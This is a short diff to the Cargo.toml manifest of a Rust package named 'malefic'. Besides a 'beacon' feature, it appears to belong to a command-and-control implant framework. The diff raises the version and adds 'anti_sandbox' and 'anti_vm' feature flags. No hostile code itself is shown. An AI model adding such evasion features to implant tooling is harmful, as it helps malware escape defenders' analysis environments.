@@ -1,6 +1,6 @@
 [package]
 name = "malefic"
-version = "0.1.0"
+version = "0.1.1"
 edition = "2021"
 build = "build.rs"
 
@@ -17,6 +17,9 @@ beacon = []
 runtime_asyncstd = ["malefic-core/async-std"]
 runtime_tokio = ["malefic-core/tokio", "tokio"]
 runtime_smol = ["malefic-core/smol"]
+
+anti_sandbox = ["malefic-helper/anti_sandbox"]
+anti_vm = ["malefic-helper/anti_vm"]
 
 [dependencies]
 cfg-if = "1.0"
